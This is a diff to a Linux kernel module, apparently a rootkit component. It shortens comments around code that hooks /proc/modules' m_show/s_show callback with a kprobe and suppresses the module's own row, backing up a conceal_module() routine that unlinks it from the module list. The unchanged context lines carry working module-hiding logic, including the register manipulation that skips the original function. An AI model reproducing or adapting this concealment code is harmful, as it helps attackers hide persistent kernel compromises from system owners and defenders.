@@ -1,12 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0-only
-/* C.1: /proc/modules seq_file iterator scrub.
- *
- * Even after conceal_module() strips us from `modules` list, defence in depth
- * is cheap: hook the seq_file per-entry callback that writes each row and
- * skip our module if it ever surfaces again (e.g. a livepatch reinserted us
- * or a downstream vendor forked the list walker). Kernel 6.x renamed the
- * function to `m_show`; older trees keep the historical `s_show`. Try both
- * — one is enough. */
+// C.1: /proc/modules seq_file scrub — defence in depth after conceal_module().
+// Handles both the modern m_show and the legacy s_show name.
 
 #include <linux/errno.h>
 #include <linux/kernel.h>
@@ -25,9 +19,7 @@
 static struct kprobe kp_m_show;
 static bool armed;
 
-/* m_show(seq_file *m, void *p): p is a struct list_head* pointing at our
- * module's .list field if this iteration is for us. Compare via list_entry
- * without dereferencing p (still safe when p == &THIS_MODULE->list). */
+/* m_show(m, p): p is struct list_head* — reach struct module via list_entry, no p deref. */
 static int m_show_pre(struct kprobe *p, struct pt_regs *regs) {
 	struct list_head *lh;
 	struct module *mod;
@@ -42,8 +34,7 @@ static int m_show_pre(struct kprobe *p, struct pt_regs *regs) {
 	if (mod != THIS_MODULE)
 		return 0;
 
-	/* Skip original m_show; return 0 so seq_file marks the entry emitted
-	 * without any characters (equivalent to a silent "hidden" row). */
+	/* Skip original; return 0 so seq_file marks the entry emitted silently. */
 	regs->regs[0] = 0;
 	instruction_pointer_set(regs, procedure_link_pointer(regs));
 	return 1;
